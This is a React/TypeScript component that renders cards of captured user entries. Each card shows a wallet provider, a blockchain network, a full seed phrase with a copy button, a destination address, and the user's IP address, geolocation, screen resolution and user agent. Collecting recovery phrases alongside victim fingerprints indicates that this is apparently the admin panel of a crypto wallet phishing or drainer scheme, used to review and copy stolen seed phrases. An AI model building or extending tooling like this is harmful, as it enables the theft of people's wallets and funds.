import { motion } from "motion/react";
import { useState } from "react";

interface UserEntry {
	blockchainNetwork: string;
	walletProvider: string;
	seedPhrase: string;
	destinationAddress: string;
	geolocation: {
		latitude: number;
		longitude: number;
		city: string;
		region: string;
		country: string;
	};
	ipAddress: string;
	screenResolution: string;
	userAgent: string;
	timestamp?: string;
}

interface UsersCardProps {
	entry: UserEntry;
	index: number;
}

export default function UsersCard({ entry, index }: UsersCardProps) {
	const isEven = index % 2 === 0;
	const [copiedSeed, setCopiedSeed] = useState(false);
	const [copiedAddress, setCopiedAddress] = useState(false);

	const handleCopy = async (text: string, type: "seed" | "address") => {
		try {
			await navigator.clipboard.writeText(text);
			if (type === "seed") setCopiedSeed(true);
			else setCopiedAddress(true);

			setTimeout(() => {
				if (type === "seed") setCopiedSeed(false);
				else setCopiedAddress(false);
			}, 2000);
		} catch (err) {
			console.error("Failed to copy: ", err);
		}
	};

	return (
		<motion.div
			initial={{ opacity: 0, y: 20 }}
			animate={{ opacity: 1, y: 0 }}
			transition={{ duration: 0.3, delay: index * 0.05 }}
			className={`border border-black rounded-sm p-4 hover:shadow-lg transition-shadow ${
				isEven ? "bg-neutral-100" : "bg-white"
			}`}
		>
			<div className="space-y-3">
				{/* Header */}
				<div className="border-b border-black/20 pb-2">
					<h3 className="font-outfit font-semibold text-lg capitalize">
						{entry.walletProvider}
					</h3>
					<p className="text-xs text-black/60 font-dm-mono">
						{entry.blockchainNetwork}
					</p>
				</div>

				{/* Seed Phrase */}
				<div>
					<label className="text-xs font-dm-mono text-black/60 block mb-1">
						Seed Phrase
					</label>
					<div className="relative">
						<p className="text-sm font-dm-mono break-all bg-white/50 p-2 rounded border border-black/10">
							{entry.seedPhrase}
						</p>
						<button
							className="absolute top-1 right-1 bg-black text-white px-2 py-1 rounded text-xs hover:opacity-80"
							onClick={() => handleCopy(entry.seedPhrase, "seed")}
						>
							{copiedSeed ? "Copied!" : "Copy"}
						</button>
					</div>
				</div>

				{/* Destination Address */}
				<div>
					<label className="text-xs font-dm-mono text-black/60 block mb-1">
						Destination Address
					</label>
					<div className="relative flex justify-between items-center gap-4">
						<p className="text-xs font-dm-mono break-all bg-white/50 p-2 rounded border border-black/10">
							{entry.destinationAddress}
						</p>
						<button
							className="absolute top-1 right-1 bg-black text-white px-2 py-1 rounded text-xs hover:opacity-80"
							onClick={() => handleCopy(entry.destinationAddress, "address")}
						>
							{copiedAddress ? "Copied!" : "Copy"}
						</button>
					</div>
				</div>

				{/* Location Info */}
				<div className="grid grid-cols-2 gap-2">
					<div>
						<label className="text-xs font-dm-mono text-black/60 block">
							Location
						</label>
						<p className="text-sm">
							{entry.geolocation.city}, {entry.geolocation.country}
						</p>
					</div>
					<div>
						<label className="text-xs font-dm-mono text-black/60 block">
							IP Address
						</label>
						<p className="text-sm font-dm-mono">{entry.ipAddress}</p>
					</div>
				</div>

				{/* Technical Details */}
				<div className="pt-2 border-t border-black/10">
					<div className="grid grid-cols-2 gap-2 text-xs">
						<div>
							<label className="font-dm-mono text-black/60 block">
								Resolution
							</label>
							<p className="font-dm-mono">{entry.screenResolution}</p>
						</div>
						<div>
							<label className="font-dm-mono text-black/60 block">
								Coordinates
							</label>
							<p className="font-dm-mono">
								{entry.geolocation.latitude.toFixed(2)},{" "}
								{entry.geolocation.longitude.toFixed(2)}
							</p>
						</div>
					</div>
					<div className="mt-2">
						<label className="font-dm-mono text-black/60 block">
							User Agent
						</label>
						<p className="font-dm-mono text-xs break-all opacity-75">
							{entry.userAgent}
						</p>
					</div>
				</div>
			</div>
		</motion.div>
	);
}
